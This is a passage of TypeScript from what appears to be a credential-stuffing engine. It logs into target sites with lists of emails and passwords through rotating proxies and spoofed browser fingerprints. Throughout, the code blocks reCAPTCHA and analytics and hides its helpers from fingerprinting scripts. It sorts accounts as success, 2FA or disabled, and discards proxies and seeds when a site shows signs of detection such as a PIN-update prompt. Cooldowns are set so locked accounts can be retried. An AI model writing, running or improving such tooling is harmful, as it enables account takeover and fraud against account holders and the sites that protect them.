                  // Wipe cookies to preserve isolation before routing the new cred
                  try {
                    await handle.page.context().clearCookies();
                    // Optional: clear local storage if possible via init scripts or domain
                  } catch (e) {
                    this.log("WARN", `Failed to wipe cookies on VIP session: ${e}`);
                  }
                }
              }

              if (!handle) {
                const pooled = workerSessionPool.get(workerSlot);
                if (pooled && pooled.backend === effectiveBackend) {
                  const age = Date.now() - pooled.createdAt;
                if (pooled.rowsProcessed < SESSION_REUSE_MAX_ROWS && age < SESSION_REUSE_MAX_AGE_MS) {
                  try {
                    // Test if the session is still alive by checking page state and browser connection
                    const testPage = pooled.handle.page;
                    if (testPage && !testPage.isClosed() && testPage.context().browser()?.isConnected() !== false) {
                      handle = pooled.handle;
                      sessionReused = true;
                      lastProxyKey = pooled.proxyKey;
                      lastProxyServer = pooled.proxyServer;
                      triedProxies.push(pooled.proxyKey);
                      this.log("INFO", `  ♻️ Reusing session (slot ${workerSlot}, ${pooled.rowsProcessed} rows, ${(age / 1000).toFixed(0)}s old)`);
                    } else {
                      // Page is dead — destroy pooled session
                      await safeCloseSession(pooled.handle);
                      workerSessionPool.delete(workerSlot);
                    }
                  } catch {
                    await safeCloseSession(pooled.handle);
                    workerSessionPool.delete(workerSlot);
                  }
                } else {
                  // Session too old or too many rows — force rotation
                  this.log("INFO", `  🔄 Session expired (slot ${workerSlot}, ${pooled.rowsProcessed} rows, ${(age / 1000).toFixed(0)}s) — rotating`);
                  await safeCloseSession(pooled.handle);
                  workerSessionPool.delete(workerSlot);
                }
              } else if (pooled) {
                // Backend mismatch — close old session
                await safeCloseSession(pooled.handle);
                workerSessionPool.delete(workerSlot);
              }
              }

            }

            if (proxyAttempt > 1) {
              // Reset N/A site outcomes so the new proxy gets a clean slate
              for (const t of targets) {
                // @ts-expect-error noUncheckedIndexedAccess
                const s = this.rows[idx].sites[t.name];
                if (s!.outcome === "N/A" || s!.outcome === "testing") {
                  s!.outcome = "queued";
                  s!.error = undefined;
                }
              }
              this.log("WARN", `  ↻ Proxy retry ${proxyAttempt}/${MAX_PROXY_RETRIES} (excluding ${triedProxies.length} prior)`);
            }

            try {
              // ── Resolve per-backend optimal settings ──
              const autoOpt = config.autoOptimizePerBackend !== false; // default true
              const bkSettings = resolveBackendSettings(effectiveBackend as string, config, assignedExpConfig, autoOpt);

              // OS profile: prefer matrix value when auto-optimize is on, else use strategy-based logic
              // Normalize legacy strategy names → new canonical names

              let resolvedOsProfile: import("../profiles/profile-useragent.js").TargetOS = "mixed";
              if (config.emulateMobile) {
                // Mobile emulation is a strict override layer requested by the user
                resolvedOsProfile = "android";
              } else if (bkSettings.osProfile && autoOpt) {
                // Matrix provides authoritative OS profile for this backend
                resolvedOsProfile = bkSettings.osProfile as any;
              } else {
                // All backends default to "windows" for maximum consistency
                resolvedOsProfile = "windows";
              }

              if (!handle) {
                // No pooled session — create fresh
                handle = await createSession({
                  advanceRotation: true,
                  slowMo: this.slowMoMs,
                  fingerprintSeed: seed,
                  excludeProxies: triedProxies,
                  email: usesCredentialIdentity ? cred.email : undefined,
                  backend: effectiveBackend as any,
                  headless: (() => {
                    if (effectiveBackend?.endsWith("-headed")) return false;
                    // Bare names ("stealth", "zendriver") and explicit -headless
                    // all resolve to headless. Never return undefined.
                    return true;
                  })(),
                  spiderApiKey: config.spiderApiKey,
                  spiderLocalApiKey: config.spiderLocalApiKey,
                  liveTest: config.liveTest,
                  enableCacheInjection: bkSettings.enableCacheInjection,
                  recordVideo: bkSettings.recordVideo ?? config.recordVideo,
                  cleanSession: bkSettings.cleanSession ?? config.cleanSession ?? true,
                  osProfile: resolvedOsProfile,
                  proxyCountry: config.proxyCountry,
                  locale: config.locale,
                  requestMode: config.requestMode,
                  enablePlaywrightTracing: config.enablePlaywrightTracing,
                  useHttpCloak: bkSettings.useHttpCloak,
                  stealthBypassHttpCloak: bkSettings.stealthBypassHttpCloak,
                  injectStealthJS: bkSettings.injectStealthJS,
                  proxyPool: assignedExpConfig?.proxyPool || config.proxyPool,
                  mullvadSessionMode: config.mullvadSessionMode,
                  requireProxy: config.requireProxy,
                  mobile: resolvedOsProfile === "android" ? true : undefined,
                  touchEvents: resolvedOsProfile === "android" ? true : undefined,
                  requeueCount: requeueCount,
                });
                (handle as any)._nodeSpawnTime = Date.now();
              }
              // Expose the live handle to the row-scoped timeout watcher so a
              // hard-timeout can actually close the session instead of leaving
              // it dangling. Cleared on every close path below + on success.
              inFlightHandle = handle;

              if (handle.page && assignedExpConfig?.inputMode) {
                (handle.page as any).__experimentalInputMode = assignedExpConfig.inputMode;
              }
              if (handle.page) {
                (handle.page as any).__currentEmail = cred.email;
                if (!(handle.page as any).__engineScriptsInjected) {
                  (handle.page as any).__engineScriptsInjected = true;
                  await handle.page.exposeFunction('__hermesMutationTelemetry', (payload: any) => {
                    this.emit("dom-mutation", {
                      email: (handle!.page as any).__currentEmail || cred.email,
                      ...payload
                    });
                  }).catch(() => { });

                  await handle.page.addInitScript(`
                    window.__automatiTimelineMatrix = {};
                    window.__automatiTimelineStart = performance.now();
                    const observer = new MutationObserver((mutations) => {
                      const selectors = ['input[type="text"]', 'input[type="password"]', 'input[type="email"]', 'button[type="submit"]', 'button'];
                      selectors.forEach(sel => {
                        const els = document.querySelectorAll(sel);
                        els.forEach(el => {
                          const rect = el.getBoundingClientRect();
                          if (rect.width > 0 && rect.height > 0 && !window.__automatiTimelineMatrix[sel]) {
                            window.__automatiTimelineMatrix[sel] = Math.round(performance.now() - window.__automatiTimelineStart);
                          }
                        });
                      });
                    });
                    document.addEventListener("DOMContentLoaded", () => {
                      observer.observe(document.body, { childList: true, subtree: true });
                    });
                  `).catch(() => { });
                }
              }

              // Upgrade 9: Fingerprint Harvesting
              if (handle && handle.sessionId) {
                if (handle.page) {
                  (handle.page as any).__sessionId = handle.sessionId;
                }
                saveFingerprintData(handle.sessionId, usesCredentialIdentity ? cred.email : "no-credential", {
                  seed: handle.fingerprintSeed,
                  proxy: handle.proxyUsed,
                  hardware: handle.hardwareProfile,
                  geo: handle.geoProfile,
                  noise: handle.noiseProfile,
                  ua: handle.uaProfile,
                  font: handle.fontProfile,
                  resolution: handle.resolutionProfile,
                  backend: handle.backend
                });
              }

              this.rows[idx]!.runContext = {
                ipAddress: handle.proxyUsed || "DIRECT",
                fingerprintInfo: handle.uaProfile ? `OS: ${handle.uaProfile?.os} | Chrome ${handle.uaProfile?.chromeMajor} | ${handle.resolutionProfile?.width}x${handle.resolutionProfile?.height}` : "Unknown",
                deviceType: handle.uaProfile?.os === "android" ? "Mobile" : "Desktop",
              };

              // Tag the recording filename with backend mode + proxy pool
              // so every .webm file is instantly identifiable by config.
              const backendAcronyms: Record<string, string> = {
                "cloak-headed": "CLK-H", "cloak-headless": "CLK-HL",
                "spider-cloud": "SPD-C", "spider-local": "SPD-L",
                "spider-local-headed": "SPD-LH",
                "curl-api": "CURL",
              };
              const bTag = backendAcronyms[handle.backend] ?? handle.backend.toUpperCase().slice(0, 6);
              const pTag = assignedExpConfig?.proxyPool ? `P${assignedExpConfig.proxyPool}` : "";
              handle.configAcronym = pTag ? `${bTag}_${pTag}` : bTag;
              if (handle.proxyUsed) {
                // Track the unique sticky-session key (server#username) so
                // rotation can pick a fresh session when the pool ships many
                // entries that share host:port and differ only in username.
                // Falling back to proxyUsed keeps older backends compatible.
                const stickyKey = handle.proxyKey ?? handle.proxyUsed;
                // Defence-in-depth assertion: pickProxy already filters by
                // `excludeProxies`, but a race in the pool manager (or a fresh
                // sticky-session that happens to map to the same key) could
                // hand us back something we've already tried. Closing the
                // session + falling through to the next proxyAttempt is safer
                // than re-running the login flow on a known-bad proxy.
                if (triedProxies.includes(stickyKey)) {
                  this.log("WARN", `  ⚠ Pool re-offered already-tried proxy ${this.maskProxyCreds(handle.proxyUsed)} — discarding and retrying`);
                  await safeCloseSession(handle);
                  inFlightHandle = null;
                  lastError = new Error(`pool re-offered tried proxy ${stickyKey}`);
                  continue;
                }
                triedProxies.push(stickyKey);
                lastProxyKey = stickyKey;
                lastProxyServer = handle.proxyUsed;
              }

              // Apply context-level network interception (Optimizations 1, 2, 3, 17, 18)
              if (handle.context) {
                // Media & Resource Stripping (Opt 18)
                // For stealth (Camoufox), images are blocked natively via block_images: true
                // at the engine level — faster and undetectable. We only block fonts/video/media
                // via route interception since Camoufox has no native option for those.
                const isStealth = handle.backend?.startsWith("stealth") ?? false;
                const mediaPattern = isStealth
                  ? '**/*.{mp4,webm,woff,woff2,ttf,otf,svg}'           // No image exts — handled by block_images
                  : '**/*.{png,jpg,jpeg,webp,gif,mp4,webm,woff,woff2,ttf,otf,ico,svg,avif}';
                await handle.context.route(mediaPattern, route => route.abort());

                // Aggressive Domain Blocking & Network Blackholing (Rule 4)
                await handle.context.route((url) => {
                  const s = url.href.toLowerCase();
                  return s.includes('analytics') || s.includes('tracking') || s.includes('pixel') ||
                    s.includes('gtm.js') || s.includes('hotjar') || s.includes('datadog') ||
                    s.includes('newrelic') || s.includes('clarity') || s.includes('mixpanel') ||
                    s.includes('recaptcha/api') || s.includes('gstatic.com/recaptcha') || s.includes('recaptcha.net');
                }, route => route.abort());

                // Cache CSS/JS (Optimization 4)
                await handle.context.route('**/*.{js,css}', async (route) => {
                  const url = route.request().url();
                  // Skip caching for dynamic API-like endpoints or anti-bot/fingerprint scripts
                  const lowerUrl = url.toLowerCase();
                  if (
                    lowerUrl.includes('?') ||
                    lowerUrl.includes('/api/') ||
                    /(bot|sec|akamai|challenge|fingerprint|fp\.js|turnstile|captcha)/i.test(lowerUrl)
                  ) {
                    return route.continue();
                  }

                  if (staticAssetCache.has(url)) {
                    const cached = staticAssetCache.get(url)!;
                    return route.fulfill({ body: cached.body, contentType: cached.contentType, headers: cached.headers });
                  }
                  try {
                    const response = await route.fetch();
                    const body = await response.body();
                    // Don't cache errors or tiny files
                    if (response.status() === 200 && body.length > 1024) {
                      if (staticAssetCache.size < MAX_CACHE_SIZE) {
                        staticAssetCache.set(url, {
                          body,
                          contentType: response.headers()['content-type'] || (url.endsWith('.css') ? 'text/css' : 'application/javascript'),
                          headers: response.headers(),
                          timestamp: Date.now()
                        });
                      }
                    }
                    return route.fulfill({ response, body, headers: response.headers() });
                  } catch {
                    return route.continue().catch(() => { });
                  }
                });

                // Inject Console Log Suppression & FPS Limit Init Script (Opts 15, 20, 21, 26)
                await handle.context.addInitScript(() => {
                  // Console Log Suppression (Opt 20)
                  ['log', 'warn', 'info', 'error', 'trace', 'debug'].forEach(m => {
                    // @ts-expect-error
                    if (console[m]) console[m] = new Proxy(console[m], { apply: () => { } });
                  });

                  // Reduced FPS via rAF throttling (Opt 21)
                  let lastTime = 0;
                  const originalRequestAnimationFrame = window.requestAnimationFrame;
                  window.requestAnimationFrame = function rAFOverride(callback, depth = 0) {
                    return originalRequestAnimationFrame((time) => {
                      if (time - lastTime >= 100 || depth > 10) { // 10 FPS cap, prevent infinite recursion
                        lastTime = time;
                        callback(time);
                      } else {
                        rAFOverride(callback, depth + 1);
                      }
                    });
                  };

                  // Disable animations and strip heavy CSS filters (Opt 15 & 26)
                  const style = document.createElement('style');
                  style.textContent = '* { transition: none !important; animation: none !important; scroll-behavior: auto !important; filter: none !important; backdrop-filter: none !important; box-shadow: none !important; }';
                  document.head?.appendChild(style) || document.addEventListener('DOMContentLoaded', () => document.head?.appendChild(style));

                  // Standardized Global Shadow-DOM Piercer (Rule 3: Deep TreeWalker)
                  // Defined via Object.defineProperty with enumerable:false so
                  // fingerprinting scripts can't detect it via Object.keys() or
                  // for...in enumeration on window.
                  Object.defineProperty(window, 'findElementDeep', {
                    value: function findElementDeep(root: any, selector: string): any {
                      if (root?.matches && root.matches(selector)) return root;
                      const localMatch = root?.querySelector ? root.querySelector(selector) : null;
                      if (localMatch) return localMatch;
                      if (root?.shadowRoot) {
                        const shadowMatch = findElementDeep(root.shadowRoot, selector);
                        if (shadowMatch) return shadowMatch;
                      }
                      const children = root?.children || (root?.childNodes ? Array.from(root.childNodes).filter((n: any) => n.nodeType === 1) : []);
                      for (const child of children) {
                        const match = findElementDeep(child, selector);
                        if (match) return match;
                      }
                      return null;
                    },
                    writable: false,
                    enumerable: false,
                    configurable: false
                  });
                });
              }

              // @ts-expect-error noUncheckedIndexedAccess
              this.rows[idx].sessionId = handle.sessionId;
              // @ts-expect-error noUncheckedIndexedAccess
              this.rows[idx].recordingUrl = handle.recordingUrl;

              // ── Register live session for Hermes CDP ──
              if (handle.page) {
                this.registerLiveSession(cred.email, handle.page);
                AgentObserver.attach(handle.page, handle.sessionId).catch((err: any) => this.log("WARN", `Failed to attach AgentObserver: ${err.message}`));
                attachStaticCache(handle.page, handle.sessionId).catch((err: any) => this.log("WARN", `Failed to attach StaticCache: ${err.message}`));
              }

              const seedTag = handle.fingerprintSeed != null ? ` seed=${handle.fingerprintSeed}` : "";
              // A3: include the chosen proxy host:port so a failed run is
              // diagnosable from a single log grep. We mask credentials.
              const proxyTag = handle.proxyUsed ? ` via ${this.maskProxyCreds(handle.proxyUsed)}` : "";
              this.log("INFO", `  Session: ${handle.sessionId}${seedTag}${proxyTag}`);
              if (handle.hardwareProfile) {
                const hp = handle.hardwareProfile;
                this.log("INFO", `  Hardware: ${hp.cores}c / ${hp.memory}GB / ${hp.gpu.vendor} ${hp.gpu.renderer}`);
              }
              if (handle.geoProfile) {
                const gp = handle.geoProfile;
                this.log("INFO", `  Geo: ${gp.countryCode} (${gp.timezone} / ${gp.locale})`);
              }
              if (handle.uaProfile) {
                const ua = handle.uaProfile;
                this.log("INFO", `  UA: Chrome ${ua.chromeMajor} on ${ua.windowsLabel} (${ua.windowsVersion})`);
              }
              if (handle.resolutionProfile) {
                const r = handle.resolutionProfile;
                this.log("INFO", `  Resolution: ${r.width}x${r.height} (${r.label})`);
              }
              if (handle.fontProfile) {
                const fp = handle.fontProfile;
                this.log("INFO", `  Fonts: ${fp.name} (${fp.fonts.length} fonts)`);
              }
              if (handle.interactionProfile) {
                const ip = handle.interactionProfile;
                this.log("INFO", `  Interaction: ${ip.name} (mouse=${ip.mouseSpeed}, type=${ip.typingSpeed}, kbd=${ip.keystrokeDelayMs}ms)`);
              }
              if (handle.extensionProfile) {
                const ex = handle.extensionProfile;
                const names = ex.extensions.map((e) => e.name).join(", ");
                this.log("INFO", `  Extensions: ${ex.extensions.length} (${names})`);
              }
              if (handle.cacheProfile) {
                const cp = handle.cacheProfile;
                const injected = config.enableCacheInjection ?? false;
                this.log("INFO", `  Cache: last_visit ${cp.lastVisitDaysAgo}d ago, sw=${cp.serviceWorkerHint}, injected=${injected}`);
              }

                const page: Page = handle.page;
              if (page && handle.backend !== "spider-cloud" && handle.backend !== "curl-api") {
                // Strict Navigation Timeout (Opt 22) to drop stalled proxies early
                page.setDefaultTimeout(15000);
                page.setDefaultNavigationTimeout(15000);
                this.emit("session-created", { page });

                // ── Clean up stale listeners from prior pool reuse ──
                const prevListeners = (page as any).__engineListeners as Array<[string, (...args: any[]) => void]> | undefined;
                if (prevListeners) {
                  for (const [evt, fn] of prevListeners) (page as any).removeListener(evt, fn);
                }
                const engineListeners: Array<[string, (...args: any[]) => void]> = [];
                (page as any).__engineListeners = engineListeners;

                // ── Hermes Observer: Start session tracking ──
                const _hermesSessionId = getHermesObserver().startSession(
                  cred.email, targets.map(t => t.name).join("|"), effectiveBackend ?? "unknown", page
                );
                (page as any).__hermesSessionId = _hermesSessionId;

                // ── Max-Level Telemetry: Transition Logger ──
                const frameNavHandler = (frame: any) => {
                  if (frame === page.mainFrame()) {
                    try {
                      const url = frame.url();
                      if (url === "about:blank") return;
                      setTimeout(async () => {
                        try {
                          const domHint = String(await page.evaluate(SHADOW_DOM_TEXT_EXTRACTOR)).substring(0, 300);
                          process.send?.({ action: 'telemetry_transition', data: { email: cred.email, url, domHint } });
                        } catch { /* intentional */ }
                      }, 1000);
                    } catch { /* intentional */ }
                  }
                };
                page.on("framenavigated", frameNavHandler);
                engineListeners.push(["framenavigated", frameNavHandler]);

                const crashHandler = () => {
                  this.log("WARN", `Browser page crashed for ${this.formatEmail(cred.email)} on proxy ${lastProxyServer || "unknown"}`);
                  page.close().catch(() => { });
                };
                page.on("crash", crashHandler);
                engineListeners.push(["crash", crashHandler]);

                // --- Threat Monitor for CAPTCHA Pre-emption ---

                // --- 30s Idle Watchdog for Hermes Anomaly Detection ---
                let watchdog: IdleWatchdog | null = null;
                watchdog = new IdleWatchdog(page, async () => {
                  try {
                    this.log("WARN", `  ⚠ Watchdog: 75s idle anomaly detected on ${cred.email}`);
                    const ts = new Date().toISOString().replace(/[:.]/g, "-");
                    const baseName = `idle-${ts}-${cred.email.replace(/[^a-zA-Z0-9]/g, "_")}`;
                    const snapPath = path.join(process.cwd(), `hermes/learning/idle_anomalies/${baseName}.html`);
                    const imgPath = path.join(process.cwd(), `hermes/learning/idle_anomalies/${baseName}.jpeg`);

                    const dom = await page.content().catch(() => "");
                    const buffer = await page.screenshot({ type: "jpeg", quality: 60 }).catch(() => null);
                    if (dom) await fs.promises.writeFile(snapPath, dom);
                    if (buffer) await fs.promises.writeFile(imgPath, buffer);

                    process.send?.({
                      action: "review_idle_anomaly",
                      data: { email: cred.email, htmlPath: snapPath, imagePath: imgPath, url: page.url() }
                    });
                  } catch { /* intentional */ }
                }, 75000);

                // Store on page so we can destroy it at end of run
                (page as any).__idleWatchdog = watchdog;

                await page.addInitScript(({ isStealth }: { isStealth: boolean }) => {

                  // ── Navigator hardware overrides ──
                  // SKIP for stealth (Camoufox) backend: Camoufox manages these at the
                  // C++ engine level. Layering JS Object.defineProperty overrides on top
                  // creates Frankenstein profiles — e.g., Camoufox generates hwConcurrency=4
                  // for a device profile but JS forces it to 8, creating a detectable
                  // inconsistency (Rule 39: strict-no-frankenstein-fingerprints).
                  if (!isStealth) {
                    Object.defineProperty(navigator, 'getBattery', {
                      value: () => Promise.resolve({
                        charging: true,
                        level: 0.95,
                        chargingTime: 0,
                        dischargingTime: Infinity,
                        onchargingchange: null,
                        onchargingtimechange: null,
                        ondischargingtimechange: null,
                        onlevelchange: null
                      })
                    });

                    // Rule §1: hardware sync — randomize within bounded ranges (2-8 cores, 4-16GB)
                    // Each page gets a consistent pair seeded once per addInitScript execution
                    const _hwCores = [2, 4, 6, 8][Math.floor(Math.random() * 4)];
                    const _devMem = [4, 8, 8, 16][Math.floor(Math.random() * 4)];
                    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => _hwCores });
                    Object.defineProperty(navigator, 'deviceMemory', { get: () => _devMem });
                  }

                  // Hide cookie banners via CSS to avoid clicking (which can fail if tracking pixels are blocked)
                  // This is safe for ALL backends — it's pure CSS, not a fingerprint override.
                  const hideCookies = () => {
                    const style = document.createElement('style');
                    style.textContent = `
                      [id*="cookie" i], [class*="cookie" i], [id*="gdpr" i], [class*="gdpr" i],
                      [id*="consent" i], [class*="consent" i], [id*="onetrust" i], [class*="onetrust" i],
                      .cc-window, .cookie-banner, .cookie-notice, #cookie-notice, #cookie-banner, #onetrust-banner-sdk {
                        display: none !important;
                        opacity: 0 !important;
                        visibility: hidden !important;
                        z-index: -9999 !important;
                        pointer-events: none !important;
                      }
                    `;
                    document.head?.appendChild(style) || document.documentElement.appendChild(style);
                  };
                  if (document.readyState === "loading") {
                    window.addEventListener("DOMContentLoaded", hideCookies);
                  } else {
                    hideCookies();
                  }
                }, { isStealth: handle.backend?.startsWith("stealth") ?? false });

              }

              if (!handle.backend || (handle.backend as any) === "cloakbrowser" || (handle.backend as any) === "cloak-headed") {
                // CloakBrowser ships native C++ patches — layering JS-Proxy stealth on top
                // raises the tampering signal so we deliberately apply NOTHING here.
                this.log("INFO", `  Stealth: cloakbrowser native (C++ patches)`);
              }

              // Process each target site SEQUENTIALLY. Disabled outcomes are
              // recorded per-site only — they no longer cascade to subsequent
              // sites in the same credential row. The tempdisabled cooldown
              // is still tracked at the row level so a future batch retries
              // it, but the OTHER site in the same row continues immediately.
              const runTarget = async (target: SiteConfig, activePage: Page, isSessionReused: boolean = false) => {
                if (this.shouldStop || rowCancelToken.cancelled) return;
                const savedBatch = getNextBatchIndex(cred.email, target.name);
                const runBatchIndex = Math.max(this.rows[idx]!.currentBatch, savedBatch);
                this.rows[idx]!.currentBatch = runBatchIndex;
                const sStatus = this.rows[idx]!.sites[target.name];
                if (sStatus!.outcome !== "queued" && sStatus!.outcome !== "testing") return;

                sStatus!.outcome = "testing";
                this.currentTarget = target.name;
                this.triggerRowUpdate(this.rows[idx]);
                this.log("INFO", `  ${target.name}: starting login flow...`);

                // ── Per-site hard timeout (150s default) ───────────────────────
                // Each target site gets its own ceiling independent of the row-level
                // timeout.  If a site exceeds this, it is abandoned and marked N/A
                // while the other site (running in parallel) can still complete.
                const SITE_TIMEOUT_SENTINEL = Symbol("site-timeout");
                const siteTimeoutMs = DynamicTimings.SITE_HARD_TIMEOUT_MS;
                let siteTimer: NodeJS.Timeout | undefined;
                const siteTimeoutPromise = new Promise<typeof SITE_TIMEOUT_SENTINEL>((resolve) => {
                  siteTimer = setTimeout(() => resolve(SITE_TIMEOUT_SENTINEL), siteTimeoutMs);
                  siteTimer.unref?.();
                });

                const siteStartTime = Date.now();
                const siteWork = (async () => {
                  try {
                    const proxyIdentifier = handle!.proxyKey ?? handle!.proxyUsed;
                    let result: LoginFlowResult;
                    if (handle!.backend === "curl-api") {
                      // Bypass Playwright completely, do direct POST via curl-impersonate
                      result = await executeCurlRestFlow(target, cred, proxyIdentifier ?? null);
                    } else if (handle!.backend === "spider-cloud") {
                      result = await this.executeSpidernewFlow(target, cred, handle!, isSessionReused);
                    } else {
                      const activePages = activePage.context().pages().length;
                      const fromUrl = activePage.url();
                      this.log("INFO", `  ↪ same-tab transition: ${fromUrl} → ${target.name} (${activePages} page${activePages !== 1 ? "s" : ""} in session)`);

                      // ── DNS Prefetching (Speed Optimization) ──
                      try {
                        const targetOrigin = new URL(target.url).origin;
                        await activePage.setContent(`<html><head><link rel="dns-prefetch" href="${targetOrigin}"><link rel="preconnect" href="${targetOrigin}"></head><body></body></html>`);
                        await new Promise(r => setTimeout(r, 20)); // Yield to network stack
                      } catch {}

                      // @ts-expect-error noUncheckedIndexedAccess
                      result = await this.executeLoginFlow(activePage, target, cred, this.rows[idx].currentBatch, config.postLoadDelay ?? 0, proxyIdentifier, handle!.backend, isSessionReused);
                    }
                    sStatus!.outcome = result.outcome;
                    sStatus!.canonicalOutcome = result.canonicalOutcome;
                    sStatus!.submitEvidence = result.submitEvidence ? [...result.submitEvidence] : undefined;
                    sStatus!.evidenceRunId = result.submitEvidence?.[0]?.runId;
                    sStatus!.selectorProvenance = result.selectorProvenance;
                    sStatus!.entryVariant = result.entryVariant;
                    sStatus!.acceptanceVariant = result.acceptanceVariant;

                    // ── Hermes Observer: Record outcome for learning ──
                    try {
                      const hsid = (activePage as any).__hermesSessionId as string | undefined;
                      if (hsid) {
                        getHermesObserver().recordOutcome(hsid, target.name, result.outcome, result.attempts ?? 1);
                      }
                    } catch { /* non-blocking */ }

                    // ── Max-Level Telemetry: Outcome Logger ──
                    process.send?.({ action: 'telemetry_outcome', data: { email: cred.email, target: target.name, outcome: result.outcome } });

                    sStatus!.attempts = result.attempts ?? 1;

                    // Phase 2 E: Report outcome to the RL Ledger to dynamically tune timings
                    const isSuccess = result.outcome === "success" || result.outcome === "2FA";
                    globalRLLedger.reportOutcome((page as any).__sessionId || "global", isSuccess);
                    // Carry the machine-readable reason for non-attempt outcomes
                    // (currently the "skipped" variants: no-creds, cooldown) into
                    // the per-site error field so dashboards / CSV consumers can
                    // distinguish the cause of the skip.
                    if (result.reason && !sStatus!.error) sStatus!.error = result.reason;
                    this.log(
                      result.outcome === "success" ? "OK" : "WARN",
                      `  → ${target.name}: ${result.outcome}${result.reason ? `:${result.reason}` : ""} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
                    );

                    if (result.misdirection) {
                      // Site-side misdirection (UPDATE YOUR PIN / PIN UPDATE on
                      // either site, OR a repeat Ignition LOGIN VERIFICATION). The
                      // session has been fingerprinted. Permanently denylist the
                      // proxy sticky session (server#username) AND the email-
                      // derived fingerprint seed so neither can be reused by
                      // this or any future run. Sibling sticky sessions on the
                      // same gateway remain usable.
                      const burnKey = handle!.proxyKey ?? handle!.proxyUsed;
                      const proxyDisplay = handle!.proxyUsed;
                      const burnSeed = handle!.fingerprintSeed;
                      const trigger = result.misdirection.trigger;
                      const burned = misdirectionDenylist.burn({
                        proxyKey: burnKey,
                        fingerprintSeed: burnSeed,
                        reason: `${target.name}:${trigger}:${result.misdirection.url}`,
                      });
                      if (burned.burnedProxy || burned.burnedSeed) {
                        void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
                        this.log("ERR", `  🔒 denylisted on ${trigger} — proxy=${burned.burnedProxy ? this.maskProxyCreds(proxyDisplay || "?") : "(already burned)"} seed=${burned.burnedSeed ? String(burnSeed) : "(already burned)"}`);
                      } else {
                        this.log("WARN", `  🔒 ${trigger} on already-denylisted proxy/seed (proxy=${this.maskProxyCreds(proxyDisplay || "?")}, seed=${burnSeed ?? "?"})`);
                      }
                      sStatus!.error = `misdirection:${trigger}:${result.misdirection.url}`;
                      if (result.requeueCredential) {
                        await this.wipeStaticCache(`${trigger} misdirection`, {
                          proxyKey: burnKey,
                          fingerprintSeed: typeof burnSeed === "number" ? burnSeed : undefined,
                        });
                        this.scheduleRequeue(idx, targets, trigger, effectiveBackend);

                        // Persist the requeue marker on disk in the SAME code path
                        // as the denylist save above so a crash between the two
                        // can't leave the proxy burned with no record of which
                        // credential still needs a retest.
                        void this.saveRequeuePending(REQUEUE_PENDING_FILE);
                      }
                    }

                    if (result.outcome === "permdisabled") {
                      this.log("ERR", `  🚫 ${cred.email} @ ${target.name}: PERMANENTLY DISABLED — outcome final for this site, continuing with other sites`);
                      if (emailDenylist.add(cred.email, target.name, `permdisabled@${target.name}`)) {
                        await emailDenylist.saveAll();
                        this.log("WARN", `  🔒 ${cred.email} added to ${target.name} email denylist — future runs will skip`);
                      }
                    } else if (result.outcome === "tempdisabled") {
                      // @ts-expect-error noUncheckedIndexedAccess
                      this.rows[idx].currentBatch++;
                      advanceBatchIndex(cred.email, target.name, this.rows[idx]!.currentBatch);
                      const cooldownUntil = new Date(Date.now() + 3600000).toISOString();
                      // @ts-expect-error noUncheckedIndexedAccess
                      this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr site-specific cooldown set (next batch: ${this.rows[idx].currentBatch}).`);

                      this.rows[idx]!.status = "tempdisabled";
                      // Store cooldown per-site so other sites on this credential can still run
                      // @ts-expect-error noUncheckedIndexedAccess
                      (this.rows[idx].sites[target.name] as any).tempDisabledUntil = cooldownUntil;
                      // @ts-expect-error noUncheckedIndexedAccess
                      this.rows[idx].tempDisabledUntil = cooldownUntil;
                      // Persist to DB via TempDisabledScheduler for crash-safe automatic requeue
                      this.tempDisabledScheduler?.schedule(cred.email, target.name);
                      // In-memory fallback timer (redundant with scheduler but harmless)
                      setTimeout(() => {
                        const currentRowIdx = this.rows.findIndex(r => r.email === cred.email);
                        if (currentRowIdx !== -1) {
                          const row = this.rows[currentRowIdx]!;
                          if (row.sites[target.name]) {
                            row.sites[target.name]!.outcome = "queued";
                            row.sites[target.name]!.attempts = 0;
                            delete (row.sites[target.name] as any).tempDisabledUntil;
                            delete row.sites[target.name]!.error;
                            delete (row as any).tempDisabledUntil;
                            if (row.status === "tempdisabled") row.status = "queued";
                            this.log("INFO", `  ⏰ 1hr cooldown finished for ${cred.email} @ ${target.name}.`);
                          }
                        }
                      }, 60 * 60 * 1000);
                    }

                    flowTracer.recordEvent({
                      type: "outcome",
                      session_id: handle?.sessionId ?? "unknown",
                      email: cred.email,
                      site: target.name,
                      message: `Final outcome: ${result.outcome}`
                    });
                    void flowTracer.flush(cred.email);
                  } catch (e: unknown) {
                    const errMsg = (e instanceof Error ? e.message : String(e)) || String(e);
                    if (e instanceof PermDisabledError) {
                      sStatus!.outcome = "permdisabled";
                      this.log("ERR", `  🚫 ${cred.email} @ ${target.name}: PERMANENTLY DISABLED — continuing with other sites`);
                      if (emailDenylist.add(cred.email, target.name, `permdisabled@${target.name}`)) {
                        await emailDenylist.saveAll();
                        this.log("WARN", `  🔒 ${cred.email} added to ${target.name} email denylist — future runs will skip`);
                      }
                    } else if (e instanceof TempDisabledError) {
                      sStatus!.outcome = "tempdisabled";
                      // @ts-expect-error noUncheckedIndexedAccess
                      this.rows[idx].currentBatch++;
                      advanceBatchIndex(cred.email, target.name, this.rows[idx]!.currentBatch);
                      // @ts-expect-error noUncheckedIndexedAccess
                      this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr site-specific cooldown set (next batch: ${this.rows[idx].currentBatch}).`);

                      this.rows[idx]!.status = "tempdisabled";
                      setTimeout(() => {
                        const currentRowIdx = this.rows.findIndex(r => r.email === cred.email);
                        if (currentRowIdx !== -1) {
                          const row = this.rows[currentRowIdx]!;
                          if (row.sites[target.name]) {
                            row.sites[target.name]!.outcome = "queued";
                            row.sites[target.name]!.attempts = 0;
                            delete row.sites[target.name]!.error;
                            if (row.status === "tempdisabled") row.status = "queued";
                            this.log("INFO", `  ⏰ 1hr cooldown finished for ${cred.email} @ ${target.name}.`);
                          }
                        }
                      }, 60 * 60 * 1000);
                    } else if (isProxyOrNetworkError(e)) {
                      // Proxy/session failure mid-flight — bubble to outer retry loop
                      // so a fresh sticky session is tried before giving up.
                      this.log("WARN", `  ⚠ ${target.name}: proxy/network error — bubbling to retry: ${errMsg.substring(0, 100)}`);
                      throw e;
                    } else {
                      sStatus!.outcome = "N/A";
                      sStatus!.error = errMsg;
